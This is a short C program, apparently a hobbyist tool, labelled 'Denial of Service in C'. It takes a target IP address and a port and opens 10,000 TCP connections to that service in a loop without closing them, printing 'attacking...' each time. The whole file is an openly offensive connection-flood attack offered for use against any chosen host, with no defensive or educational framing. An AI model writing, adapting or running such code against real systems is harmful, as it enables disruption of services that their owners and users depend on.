#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (int argc, char *argv[]) {

	printf("################################ \n");
	printf("#    Denial of Service in C    # \n");
	printf("################################ \n");

	if (argc != 2)
		printf("How to use: %s <ip addr>", argv[0]);
	else {
		int sckt;
		struct sockaddr_in target;
		int port;

		printf("Service port to be attacked? ");
		scanf("%d", &port);

		for(int i = 0; i < 10000; i++) {

			sckt = socket(AF_INET, SOCK_STREAM, 0);
        		target.sin_family = AF_INET;
       			target.sin_port = htons(port);
	        	target.sin_addr.s_addr = inet_addr(argv[1]);
        		connect (sckt, (struct sockaddr *) &target, sizeof target);

			printf("attacking...\n");
		}
	}
}
